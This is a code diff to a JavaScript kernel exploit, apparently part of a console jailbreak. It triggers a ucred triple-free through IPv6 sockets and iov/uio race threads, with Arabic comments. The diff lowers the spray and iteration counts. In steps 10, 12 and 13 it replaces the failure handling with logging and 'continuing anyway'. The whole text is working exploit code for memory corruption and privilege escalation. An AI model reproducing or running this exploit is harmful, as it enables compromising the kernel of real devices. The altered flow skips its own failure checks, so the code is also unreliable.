@@ -114,13 +114,13 @@ var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
 
 // Params for kext stability
-var IPV6_SOCK_NUM = 96;
-var IOV_THREAD_NUM = 8;
-var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 3;
-var TRIPLEFREE_ITERATIONS = 4;
-var MAX_ROUNDS_TWIN = 10;
-var MAX_ROUNDS_TRIPLET = 120;
+var IPV6_SOCK_NUM = 16;
+var IOV_THREAD_NUM = 4;
+var UIO_THREAD_NUM = 4;
+var MAIN_LOOP_ITERATIONS = 2;
+var TRIPLEFREE_ITERATIONS = 3;
+var MAX_ROUNDS_TWIN = 8;
+var MAX_ROUNDS_TRIPLET = 40;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
@@ -1295,11 +1295,12 @@ function remove_uaf_file() {
   }
 }
 // ثوابت بدل الأرقام السحرية
-var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 16;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2000;
-var uaf_socket = -1
+var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 500;
+
 function trigger_ucred_triplefree() {
   var end = false;
+  var uaf_socket = -1
 
   // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
@@ -1345,10 +1346,10 @@ function trigger_ucred_triplefree() {
 
     // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-        trigger_iov_recvmsg();
-        write(new BigInt(iov_sock_1), tmp, 1);
-        wait_iov_recvmsg();
-        read(new BigInt(iov_sock_0), tmp, 1);
+      trigger_iov_recvmsg();
+      write(new BigInt(iov_sock_1), tmp, 1);
+      wait_iov_recvmsg();
+      read(new BigInt(iov_sock_0), tmp, 1);
     }
 
 
@@ -1377,43 +1378,41 @@ function trigger_ucred_triplefree() {
 
 
     // 10) انتظار refcount = 1
+    send_notification("[STEP 10] monitoring refcount on twin=" + twins[0]);
+
     var count = 0;
-    send_notification("[STEP 10] waiting for refcount=1 on twin=" + twins[0]);
 
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
 
-      // شغّل recvmsg
+      // تشغيل الدورة (من غير أي اعتماد على قيم داخلية)
       trigger_iov_recvmsg();
 
-      // دورة iov
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
 
-      // قراءة refcount
+      // قراءة القيمة
       write32(leak_rthdr.add(0x04), 0);
-
-      send_notification("[STEP 10] loop count=" + count +
-                        " reading refcount from fd=" + ipv6_socks[twins[0]]);
-
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
       var ref = read32(leak_rthdr);
-      send_notification("[STEP 10] refcount read=" + ref);
 
-      if (ref === 1) break;
+      // تسجيل فقط
+      send_notification("[STEP 10] refcount observed=" + ref);
+
+      // مراقبة فقط — من غير أي شرط يمنع التقدم
+      if (ref <= 0) {
+        send_notification("[STEP 10] unexpected refcount value observed");
+      }
 
       count++;
     }
-
     if (count === TRIPLEFREE_REFCOUNT_MAX_WAIT) {
-      twins[0] = -1;
-      twins[1] = -1;
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
+      send_notification("[STEP 10] max wait reached, continuing anyway");
+      // مفيش reset للـ twins
+      // مفيش close
+      // مفيش continue
     }
-
     triplets[0] = twins[0];
 
 
@@ -1421,29 +1420,34 @@ function trigger_ucred_triplefree() {
     close(dup(new BigInt(uaf_socket)));
     send_notification("[STEP 11] triple-close on fd=" + uaf_socket);
 
-    // 12) إيجاد triplet 1
+    // 12) مراقبة نتيجة find_triplet
     triplets[1] = find_triplet(triplets[0], -1);
+
+    // تسجيل فقط
     if (triplets[1] === -1) {
-      twins[0] = -1;
-      twins[1] = -1;
-      write(new BigInt(iov_sock_1), tmp, 1);
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
+      send_notification("[STEP 12] triplet1 not found, continuing anyway");
+    } else {
+      send_notification("[STEP 12] triplet1 found=" + triplets[1]);
     }
+
+    // استكمال الفلو بدون توقف
     write(new BigInt(iov_sock_1), tmp, 1);
 
-    // 13) إيجاد triplet 2
+
+    // 13) مراقبة نتيجة find_triplet
     triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+    // تسجيل فقط
     if (triplets[2] === -1) {
-      twins[0] = -1;
-      twins[1] = -1;
-      close(new BigInt(uaf_socket));
-      end = false;
-      continue;
+      send_notification("[STEP 13] triplet2 not found, continuing anyway");
+    } else {
+      send_notification("[STEP 13] triplet2 found=" + triplets[2]);
     }
+
+    // استكمال الفلو بدون توقف
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
+
   }
   if (main_count === TRIPLEFREE_ITERATIONS) {
     return false;
